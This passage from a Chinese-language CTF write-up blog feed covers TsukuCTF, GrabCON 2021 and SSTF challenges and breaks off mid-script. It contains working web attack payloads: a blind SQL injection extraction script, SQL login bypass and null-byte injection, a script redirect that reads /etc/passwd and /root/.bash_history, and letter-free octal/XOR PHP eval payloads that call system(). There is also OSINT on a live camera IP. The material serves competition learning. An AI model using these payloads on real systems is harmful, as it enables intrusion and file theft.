&lt;span style="color:#111">execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;select distinct table_name from information_schema.columnns limit 1 offset &lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;select distinct column_name from information_shcema.columns where table_name=&amp;#39;urtla_secret_tsukushi&amp;#39;limit 1 offset &lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">33&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;select secret from urtla_secret_tsukushi_limit 1 offset &lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™æ˜¯å®˜æ–¹wpé‡Œçš„äºŒåˆ†æ³•è„šæœ¬ï¼ŒæŠŠç®€å•çš„äº‹æ‹†æˆäº†3ä¸ªå‡½æ•°ï¼Œå€’æ˜¯ä¹Ÿå¥½ï¼Œå¯å¤ç”¨æ€§max&lt;/p>
&lt;p>&lt;code>TsukuCTF{U_Are_Geni0us_T$UKUSH1}&lt;/code>&lt;/p>
&lt;h2 id="webjourney">Web/Journey&lt;/h2>
&lt;p>æŠ“åŒ…çœ‹ï¼Œæœ‰å¾ˆå¤š307é‡å®šå‘ï¼Œè¿˜ä»¥ä¸ºæ˜¯è·Ÿä¹‹å‰é‚£ä¸ªä¸€æ ·è¦è·‘ä¸€ä¸‹ä¸€åƒå¤šæ¬¡çš„é‡å®šå‘ï¼Œä½†æ˜¯è¿™ä¸ªé‡å®šå‘æ˜¯æœ‰é™åº¦çš„ï¼Œæœ€åçš„ä½ç½®æ˜¯/problems/journey/goalï¼Œå›æ˜¾405é”™è¯¯&lt;/p>
&lt;p>çœ‹wpï¼Œå­¦åˆ°äº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl -H &lt;span style="color:#d88200">&amp;#39;Referer: https://tsukuctf.sechack365.com/problems/journey/railway/1&amp;#39;&lt;/span> -X CONNECT https://tsukuctf.sechack365.com/problems/journey/goal
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210913114745032.png" alt="image-20210913114745032">&lt;/p>
&lt;p>åˆ©ç”¨çš„æ˜¯httpè¯·æ±‚ä¸­çš„connectæ–¹æ³•ï¼Œç›¸å…³å†…å®¹å¯å‚è§-&amp;gt;&lt;a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/CONNECT">CONNECT(MDN)&lt;/a> | &lt;a href="https://www.jianshu.com/p/54357cdd4736">HTTPä¹‹connect method&lt;/a>&lt;/p>
&lt;h2 id="webgyotaku">Web/gyOTAKU&lt;/h2>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210913120544616.png" alt="image-20210913120544616">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210913120625401.png" alt="image-20210913120625401">&lt;/p>
&lt;p>æ»¡è¶³17è¡Œè¦æ±‚çš„è¯ä¼šé€šè¿‡chromium browseræ¥è¿”å›ä¸€ä¸ªæˆªå›¾&lt;/p>
&lt;p>æˆ‘ä»¬æ„é€ ä¸€ä¸ªå¦‚ä¸‹çš„htmlé¡µé¢&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;
&lt;/code>&lt;/pre>&lt;p>è¿”å›500é”™è¯¯ï¼Œå†è¯•ä¸€ä¸‹&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;script&amp;gt;location.href=&amp;quot;/etc/passwd&amp;quot;&amp;lt;/script&amp;gt;
&lt;/code>&lt;/pre>&lt;p>æˆåŠŸè¿”å›&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210913190757615.png" alt="image-20210913190757615">&lt;/p>
&lt;p>ç”¨ä¸€ä¸‹æˆ‘ä»¬çš„è€æœ‹å‹/root/.bash_history&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;script&amp;gt;location.href=&amp;quot;/root/.bash_history&amp;quot;&amp;lt;/script&amp;gt;
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210913191326852.png" alt="image-20210913191326852">&lt;/p>
&lt;p>å¯ä»¥è¯»ä¸€ä¸‹flagäº†&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;script&amp;gt;location.href=&amp;quot;/root/flagc464f9eba1.txt&amp;quot;&amp;lt;/script&amp;gt;
&lt;/code>&lt;/pre>&lt;p>&lt;code>TsukuCTF{Tsukushi_to_Sugina_no_chigai_ga_wakaran}&lt;/code>&lt;/p>
&lt;hr>
&lt;p>æ°´ä¸€ç¯‡wpï¼Œæ°´æ°´æ›´å¥åº·&lt;/p></description></item><item><title>GrabCONCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/09/07/grabconctf2021-wp/</link><pubDate>Tue, 07 Sep 2021 11:22:14 +0800</pubDate><guid>https://amiaaaz.github.io/2021/09/07/grabconctf2021-wp/</guid><description>&lt;h2 id="webe4sy-pe4sy">Web/E4sy Pe4sy&lt;/h2>
&lt;blockquote>
&lt;p>Hack admin user!&lt;/p>
&lt;p>Author: &lt;strong>r3curs1v3_pr0xy&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>ä¸‡èƒ½å¯†ç  &lt;code>username=admin&amp;amp;password=%27%3D%27&lt;/code>&lt;/p>
&lt;p>&lt;code>GrabCON{E4sy_pe4sy_SQL_1nj3ct10n}&lt;/code>&lt;/p>
&lt;h2 id="webdoor-lock">Web/Door Lock&lt;/h2>
&lt;blockquote>
&lt;p>The door is open to all! See who is behind the admin door??&lt;/p>
&lt;p>Author: &lt;strong>r3curs1v3_pr0xy&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>å’Œä¸Šé¢é‚£ä¸ªä¸€æ ·çš„å‰ç«¯é¡µé¢ï¼Œä½†æ˜¯å¾ˆæ˜¾ç„¶ä¸‡èƒ½å¯†ç å¤±æ•ˆï¼Œéšä¾¿ç™»å…¥ä¸€ä¸ªå·ï¼Œæœ‰æ°´å¹³è¶Šæƒ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210904212157898.png" alt="image-20210904212157898">&lt;/p>
&lt;p>ç”¨burpè·‘ä¸€ä¸‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906134840366.png" alt="image-20210906134840366">&lt;/p>
&lt;p>&lt;code>GrabCON{E4sy_1D0R_}&lt;/code>&lt;/p>
&lt;h2 id="webnull-food-factory">Web/Null Food Factory&lt;/h2>
&lt;blockquote>
&lt;p>Prove your hacking skill to get admin panel.&lt;/p>
&lt;p>Author: &lt;strong>r3curs1v3_pr0xy&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>è¿˜æ˜¯ä¸€æ¨¡ä¸€æ ·çš„å‰ç«¯ï¼Œç›®æ ‡è¿˜æ˜¯ä»¥adminç™»å…¥&lt;/p>
&lt;p>ç”¨åˆ°çš„æ˜¯Null byte injectionï¼Œå…ˆä»¥&lt;code>admin%00&lt;/code>ä¸ºç”¨æˆ·åæ³¨å†Œ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210907105417519.png" alt="image-20210907105417519">&lt;/p>
&lt;p>ç„¶åç”¨Adminçš„åå­—ç™»å…¥&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210907105241455.png" alt="image-20210907105241455">&lt;/p>
&lt;p>&lt;code>GrabCON{Null_byt3s_1s_L0v3}&lt;/code>&lt;/p>
&lt;h2 id="webbasic-calc">Web/Basic Calc&lt;/h2>
&lt;blockquote>
&lt;p>Ever used calc based on php?&lt;/p>
&lt;p>Author: &lt;strong>karma&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;eq&amp;#34;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;span style="color:#111">$eq&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;eq&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/[A-Za-z`]+/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$eq&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;BAD.&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;Result: &amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;echo &amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$eq&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#d88200">&amp;#34; ;&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index.php&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç°åœ¨çœ‹åˆ°phpçš„é¢˜æ„Ÿè§‰é‚£æ˜¯ç›¸å½“çš„äº²åˆ‡äº†â€¦â€¦&lt;/p>
&lt;p>è™½ç„¶æ˜¯ç›´æ¥æœ‰äº†evalï¼Œä½†æ˜¯è¿™ä¸ªæ­£åˆ™è¿‡æ»¤çš„æœ‰ç‚¹ç‹ ï¼Œå­—æ¯å…¨è¢«banæ‰ å°±åªèƒ½ç”¨xoræˆ–å…«è¿›åˆ¶çš„æ–¹å¼æ¥æŠŠå­—æ¯æå‡ºæ¥&lt;/p>
&lt;p>å…«è¿›åˆ¶ç‰ˆæœ¬ï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;quot;\163\171\163\164\145\155&amp;quot;(&amp;quot;\154\163&amp;quot;)
// &amp;quot;system&amp;quot;(&amp;quot;ls&amp;quot;)
&amp;quot;\163\171\163\164\145\155&amp;quot;(&amp;quot;\143\141\164\40\57\146\154\141\147\147\147\147\56\164\170\164&amp;quot;)
// &amp;quot;system(&amp;quot;cat /flagggg.txt&amp;quot;)&amp;quot;
&lt;/code>&lt;/pre>&lt;p>xor&lt;/p>
&lt;pre tabindex="0">&lt;code>Ouput:
(&amp;quot;system&amp;quot;)(&amp;quot;cat /flagggg.txt&amp;quot;) = (('3'^'@').('9'^'@').('3'^'@').('4'^'@').('8'^']').('2'^'_'))(('8'^'[').('!'^'@').('4'^'@').('^'^'~').'/'.('8'^'^').('1'^']').('!'^'@').('8'^'_').('8'^'_').('8'^'_').('8'^'_').'.'.('4'^'@').('8'^'@').('4'^'@'))
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210907111823056.png" alt="image-20210907111823056">&lt;/p>
&lt;p>&lt;code>GrabCON{b4by_php_f0r_y0u}&lt;/code>&lt;/p>
&lt;p>å‚è€ƒï¼š &lt;a href="https://mystiz.hk/posts/2021-08-10-uiuctf-phpfuck/">https://mystiz.hk/posts/2021-08-10-uiuctf-phpfuck/&lt;/a> | &lt;a href="https://ctf.0xff.re/2021/uiuctf_2021/phpfuck">https://ctf.0xff.re/2021/uiuctf_2021/phpfuck&lt;/a> | &lt;a href="https://github.com/vichhika/CTF-Writeup/blob/main/GrabCON%20CTF%202021/Web/Basic%20Calc/README.md">https://github.com/vichhika/CTF-Writeup/blob/main/GrabCON%20CTF%202021/Web/Basic%20Calc/README.md&lt;/a> | &lt;a href="https://discord.com/channels/740598439796015204/884036729902866463/884147222982324264">https://discord.com/channels/740598439796015204/884036729902866463/884147222982324264&lt;/a>&lt;/p>
&lt;h2 id="osintprotondate">OSINT/ProtonDate&lt;/h2>
&lt;blockquote>
&lt;p>Can you find the date, when was this email created?&lt;/p>
&lt;p>sc4ry_gh0st@protonmail[dot]com&lt;/p>
&lt;p>GrabCON{dd_mm_yyyy}&lt;/p>
&lt;p>Author: &lt;strong>CETACEAN&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>è¯´å®è¯ æ˜¯çº¯çŒœçš„&lt;/p>
&lt;p>&lt;code>GrabCON{03_09_2021}&lt;/code>&lt;/p>
&lt;p>ä½†æ˜¯çœ‹äº†wpä¹‹åå‘ç°è¿™ç¡®å®æœ‰æ­£è§„çš„åšæ³•ï¼Œä¸€ä¸ªå¼€æºå·¥å…·å«&lt;a href="https://github.com/pixelbubble/ProtOSINT">ProtOSINT&lt;/a>ï¼Œæ‰€ä½¿ç”¨çš„apiå¦‚ä¸‹&lt;/p>
&lt;pre tabindex="0">&lt;code>https://api.protonmail.ch/pks/lookup?op=index&amp;amp;search=sc4ry_gh0st@protonmail.com
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906131321553.png" alt="image-20210906131321553">æ‹¿åˆ°æ—¶é—´æˆ³1630658267ï¼Œå³Fri 3 September 2021 08:37:47 UTC&lt;/p>
&lt;h2 id="osintvictim-1">OSINT/Victim 1&lt;/h2>
&lt;blockquote>
&lt;p>We got to know our victims is hiding somewhere. We got access to live CCTV camera of that place. Can you find zip code of that location?&lt;/p>
&lt;p>&lt;a href="http://31.207.115.133:8080/cgi-bin/faststream.jpg?stream=half&amp;amp;fps=15&amp;amp;rand=COUNTER">Live Camera&lt;/a>&lt;/p>
&lt;p>GrabCON{zipcode}&lt;/p>
&lt;p>Author: &lt;strong>CETACEAN&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>ç»™äº†ä¸€ä¸ªæ‘„åƒå¤´çš„åœ°å€ï¼Œç”¨&lt;a href="https://www.iplocation.net/ip-lookup">IP geolocation lookup&lt;/a>æŸ¥ä¸€ä¸‹åœ°ç‚¹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906210732263.png" alt="image-20210906210732263">&lt;/p>
&lt;p>ç”»é¢å³ä¸Šæœ‰ä¸ªåœ¨åŠ¨çš„ç¼†è½¦&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906211008725.png" alt="image-20210906211008725">&lt;/p>
&lt;p>zipcode: 39031&lt;/p>
&lt;p>&lt;code>GrabCON{39031}&lt;/code>&lt;/p>
&lt;h2 id="osintwebsite">OSINT/Website&lt;/h2>
&lt;blockquote>
&lt;p>My friend is having a website named, &amp;ldquo;Great Animals Here&amp;rdquo;. He have leaked the flag on his website. Can you find the flag?&lt;/p>
&lt;p>Hint: He used free website builder tool to create his site. greatanimalshere&lt;/p>
&lt;p>Author: &lt;strong>CETACEAN&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;a href="https://greatanimalshere.weebly.com/">https://greatanimalshere.weebly.com/&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210907101731335.png" alt="image-20210907101731335">&lt;/p>
&lt;h2 id="osintthe-tour1">OSINT/The Tour(1)&lt;/h2>
&lt;blockquote>
&lt;p>w0nd3r50uL! I know her but she did something horrible! She recently switched to some free and open-source software for running self-hosted social networking services. Check out her profile and find the last location she visited when she felt hungry?&lt;/p>
&lt;p>Author : &lt;strong>rey&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906211622007.png" alt="image-20210906211622007">&lt;/p>
&lt;p>ç©ºçš„ï¼Œè¯•ä¸€ä¸‹wayback machine&lt;/p>
&lt;pre tabindex="0">&lt;code>https://web.archive.org/web/20210904191920/https://www.reddit.com/user/w0nd3r50uL/
&lt;/code>&lt;/pre>&lt;p>ä¹Ÿæ˜¯ç©ºçš„ï¼Œç”¨&lt;a href="https://github.com/sherlock-project/sherlock">sherlock&lt;/a>æŸ¥ä¸€ä¸‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906214255872.png" alt="image-20210906214255872">&lt;/p>
&lt;p>åé¢çš„å†…å®¹å¯ä»¥&lt;a href="https://kashmir54.github.io/ctfs/GrabCON/#the-tour1">è¯¦è§wp&lt;/a>äº†ï¼Œå¾ˆå°‘åšOSINTï¼Œä½†æ˜¯æ„Ÿè§‰å¥½æœ‰æ„æ€ï¼Œå°±æ˜¯æ‰¾çš„å¥½éº»çƒ¦ï¼Œè„‘æ´å¥½å¤§ï¼Œä¸å®¹æ˜“å•Š&lt;/p>
&lt;h2 id="osintthe-tour2">OSINT/The Tour(2)&lt;/h2>
&lt;blockquote>
&lt;p>Can you find the flight number and the flight operator of the last flight that took her to the final destination? E.g. GrabCON{AF226_Air_France}&lt;/p>
&lt;p>Author : &lt;strong>rey&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>wp-&amp;gt;https://kashmir54.github.io/ctfs/GrabCON/#the-tour2&lt;/p>
&lt;h2 id="miscwelcome">Misc/Welcome&lt;/h2>
&lt;blockquote>
&lt;p>GrabCON{welcome_to_grabcon_2021}&lt;/p>
&lt;/blockquote>
&lt;p>&lt;code>GrabCON{welcome_to_grabcon_2021}&lt;/code>&lt;/p>
&lt;h2 id="miscdiscord">Misc/Discord&lt;/h2>
&lt;blockquote>
&lt;p>Join our &lt;a href="https://discord.gg/8F9VMVCWb2">discord&lt;/a> server!&lt;/p>
&lt;/blockquote>
&lt;p>æ†¨æ‰¹æœºå™¨äººï¼Œæˆ‘æ²¡ææ˜ç™½è¿™ä¸ªæ˜¯æ€ä¹ˆç©çš„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210905092539802.png" alt="image-20210905092539802">&lt;/p>
&lt;p>tmd è¯•äº†å¥½ä¹… ç»“æœç«Ÿç„¶åœ¨#role&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906121117043.png" alt="image-20210906121117043">&lt;/p>
&lt;p>&lt;code>GrabCON{s@n1ty_fl4g_1s_here}&lt;/code>&lt;/p>
&lt;p>fxxxk&lt;/p>
&lt;h2 id="miscyoutube">Misc/YouTube&lt;/h2>
&lt;blockquote>
&lt;p>Find us on YouTube.&lt;/p>
&lt;/blockquote>
&lt;p>&lt;code>GrabCON{th3_qu1ck_br0wn_f0x_jumps_0v3r_th3_lazy_d0g}&lt;/code>&lt;/p>
&lt;h2 id="miscfind-me">Misc/Find me&lt;/h2>
&lt;blockquote>
&lt;p>Checkout author&amp;rsquo;s social media.&lt;/p>
&lt;p>Author: &lt;strong>Offen5ive&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210905103746359.png" alt="image-20210905103746359">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210907101222360.png" alt="image-20210907101222360">&lt;/p>
&lt;p>&lt;code>GrabCON{n0_fl4g_h3r3}&lt;/code>&lt;/p>
&lt;h2 id="cryptowarm-up">Crypto/Warm-up&lt;/h2>
&lt;blockquote>
&lt;p>Mukesh used to drink and then smoke 5 times a day. He is now suffering form cancer his drink was 64 rupees and 32 rupees cigarette that costs to cheap for him. And he has this much of cancer now.&lt;/p>
&lt;p>Author: &lt;strong>Offen5ive&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;pre tabindex="0">&lt;code>file:///D:/CyberChef_v9.30.0/CyberChef_v9.30.0.html#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)&amp;amp;input=UzAxWlJFTlhVMU5KVmtoR1VWWktVa3BhUmtaTk1sTkxTVFZLVkVOV1UweExWbFpZUVZsTFZFbGFUa1ZWVmxSTlMwcElSa2MyVTFkS1ZrcEhWMDFMV0V0YVExVlZWRU5YVGxKT1JsTlZTMWRPVWtkR1MwMUVWVXMxUzBkWFZsTkxTMXBEV0ZGVVExUk9VbGxGVDFWVVRFMVNURlpEVFV4RlNrNU1SMWMwUTBsTFdWbEVRMVJEV0V0V01rWk5WakpXVGtKS1JrMVNTMDlNUWt0SFYwNUVXa3RLVjBVMFZsTk9UbEpUUlZkV1ZFdExTa3hXUjAxQ1VrbE9URWRYTlVOUVMwNVhSa1ZTUTFkTFdraEZTVlZhVWs5Q1RVWkZNakpYUzFaS1ZFTlhVMHRMV2xaV1ZWSlRWVWRHVEVaTFZrTkdSMFpJVlRSU1UxWlFSa2RYV1ZSVFRVdE9WbFJMVkV0VFIwWlNWRUZWU2xGTlVrZEdTVlpVVFVzMVNrWk5WRXhhUzFwV1dFbFdNazVPVGt4Rk5GWlVTMHBLVEZaSlVreFJTbFpLUjFkTlMxUkxUVmxFVTFSRFZrNU9Na1ZSVmpKWFNscExSazFXVEZWS1RrcFVRMVZUUlV0YVYwVTBWakpUUjBKT1JrbFZVMWROVWt4R1RWSk1WVXBTU2xkWE5rTllTMGxaVmxWU1ExUkhRVmxWVDFaRFJrMVNUVVUwVmt0UFMwWktWRU5UVTBWTFdsZEdUVlpMVWtkR1UwVTJWa3hNVFZKTlZrdE5TMWROUmt0WFYwOUxSRXRGV1VaVlZVTldUazR5UlZGVldsSlBRa2RHVFZKTFQwczFTMVJCTTBOTlMwcFdXRkZUUTFoTFdsTkZTVlpNVEUxU1JGWkpNakl5U2xKTVIxZFVVMGhMU1ZsV1ZWTXlWMDVPVTBaSFZUTXlTa3BHUmtzeU0wVkxWa2xXVFZWVFZVdFNTMWhKVkRKWFIwSk9SazFXVERKS1NrMUdSVTFETWt0T1RFVkxVbE5YUzA1WFJVMVZRMUpPVGxORlQxWkVNa3BHTlVaUFZreE1SMFpLVkVGWFUwOUxXVmxWTkZKVFZFZEdXVVZKVmxKUlRsSktSVEl5V2xaS05VdEhWMDVMUjB0V1RFWlZWa05YVGswMFZVZFZNMHhNU2taR1N6SXpXVXRLU2xkWFUxTk1TMGxaVjBkTlMxSkhSa3BGV1ZaTVRFcGFUVlpMVmxOUFNsSkxWRUUxUTFOTE5VdFdSVlpEVjB0V1NFWk5WVkpSU1ZWWlJrMHlNa2RMV2twWFZWWlRTa3RhUzBSQlQwdFJTMUZaUkZOVlExSklWVFpSUFQwOVBRPT0K
&lt;/code>&lt;/pre>&lt;p>å…¨éƒ¨æ˜¯b64åŠ å¯† å¾ˆç®€å•äº†&lt;/p>
&lt;p>&lt;code>GrabCON{dayuum_s0n!}&lt;/code>&lt;/p>
&lt;hr>
&lt;p>å¥½èœå¥½èœï¼Œå¼€å­¦äº† å¥¥é‡Œç»™&lt;/p></description></item><item><title>SSCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/09/05/ssctf2021-wp/</link><pubDate>Sun, 05 Sep 2021 11:09:54 +0800</pubDate><guid>https://amiaaaz.github.io/2021/09/05/ssctf2021-wp/</guid><description>&lt;p>&lt;a href="https://research.samsung.com/sstf">https://research.samsung.com/sstf&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://playground.sstf.site/challenges">https://playground.sstf.site/challenges&lt;/a>&lt;/p>
&lt;h2 id="tutorialpractice-flag-submission">Tutorial/Practice: Flag Submission&lt;/h2>
&lt;p>&lt;code>SCTF{It_15_tim3_t0_hack!!}&lt;/code>&lt;/p>
&lt;h2 id="tutorialbof-101">Tutorial/BOF 101&lt;/h2>
&lt;p>&lt;a href="https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212261&amp;amp;authkey=%21AO4uYzudT40Rn_Y&amp;amp;em=2">https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212261&amp;amp;authkey=%21AO4uYzudT40Rn_Y&amp;amp;em=2&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210816204446737.png" alt="image-20210816204446737">&lt;/p>
&lt;p>&lt;code>SCTF{n0w_U_R_B0F_3xpEr7}&lt;/code>&lt;/p>
&lt;h2 id="tutorialbof-102">Tutorial/BOF 102&lt;/h2>
&lt;p>&lt;a href="https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212251&amp;amp;authkey=%21AMhDJ94NiXLWqYs&amp;amp;em=2">https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212251&amp;amp;authkey=%21AMhDJ94NiXLWqYs&amp;amp;em=2&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">telnetlib&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Telnet&lt;/span>
&lt;span style="color:#111">tn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Telnet&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;bof102.sstf.site&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">1337&lt;/span>&lt;span style="color:#111">)&lt;/span>
